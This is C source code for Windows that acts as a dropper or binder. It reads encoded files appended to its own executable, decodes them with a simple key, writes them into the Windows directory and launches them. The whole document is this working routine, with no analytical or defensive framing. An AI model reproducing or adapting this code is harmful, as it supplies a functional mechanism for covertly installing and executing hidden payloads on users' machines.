#include <windows.h>
#include <shellapi.h>
#define IMAGE_TAIL 0x800
struct pack_entry {
	char name[40];
	unsigned long size;
	int key;
	short path;
	short run;
} g_entry;
void UnpackBuf(char *out, unsigned long outLen, char *kmat)
{
	unsigned long n;
	char *kk = kmat;
	for (n = 0; n < outLen; n++) {
		if (!(*kk))
			kk = kmat;
		*out -= *kk;
		*out++ ^= *kk++;
	}
}
int Boot(void)
{
	HANDLE hMe, hNew;
	DWORD got, put;
	char me[260], dst[260], ks[6], *tmp = "";
	GetModuleFileName(NULL, me, 260);
	hMe = CreateFile(me, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	SetFilePointer(hMe, IMAGE_TAIL, NULL, FILE_BEGIN);
	while (ReadFile(hMe, &g_entry, sizeof g_entry, &got, NULL) && got) {
		GetWindowsDirectory(dst, sizeof dst);
		lstrcat(dst, "\\");
		lstrcat(dst, g_entry.name);
		hNew = CreateFile(dst, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hNew == INVALID_HANDLE_VALUE)
			return 1;
		wsprintf(ks, "%d", g_entry.key);
		tmp = malloc(g_entry.size);
		ReadFile(hMe, tmp, g_entry.size, &got, NULL);
		UnpackBuf(tmp, got, ks);
		WriteFile(hNew, tmp, got, &put, NULL);
		free(tmp);
		CloseHandle(hNew);
		if (g_entry.run)
			ShellExecute(NULL, "open", dst, NULL, NULL, SW_SHOWNORMAL);
	}
	CloseHandle(hMe);
	return 0;
}
